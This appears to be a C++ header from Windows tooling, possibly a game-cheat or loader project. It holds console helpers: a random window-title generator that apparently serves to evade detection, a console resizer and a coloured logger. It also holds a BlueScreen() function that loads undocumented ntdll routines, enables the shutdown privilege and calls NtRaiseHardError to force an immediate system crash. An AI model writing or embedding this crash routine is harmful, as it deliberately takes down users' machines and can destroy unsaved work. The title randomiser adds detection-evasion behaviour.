#pragma once
#include "Includes.h"

using namespace std;

/* Title Changer */
auto rndmTitle() -> void {

	constexpr int length = 15;
	const auto characters = TEXT("2s119sf3f59gga60473wxyzABCfDEFGHIJKLMNOPQRSTUVWXYZ1234567890");
	TCHAR title[length + 1]{};

	for (int j = 0; j != length; j++)
	{
		title[j] += characters[rand() % 45 + 1];
	}

	SetConsoleTitle(title);
}

/* Console Size */
auto SetConsoleSize() -> void {

	HANDLE hOut;
	SMALL_RECT DisplayArea = { 0, 0, 0, 0 };
	int x = 81;
	int y = 26;
	hOut = GetStdHandle(STD_OUTPUT_HANDLE);
	DisplayArea.Right = x;
	DisplayArea.Bottom = y;
	SetConsoleWindowInfo(hOut, TRUE, &DisplayArea);
}

void Log(string Message, int LogType = 15)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);;

	SYSTEMTIME st, lt;

	GetSystemTime(&st);
	GetLocalTime(&lt);

	SetConsoleTextAttribute(hConsole, 6);
	printf(("[%02d:%02d:%02d] "), st.wHour, st.wMinute, st.wSecond);

	SetConsoleTextAttribute(hConsole, LogType);
	cout << Message << endl;

	SetConsoleTextAttribute(hConsole, 15);
}

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void BlueScreen()
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	return ;
}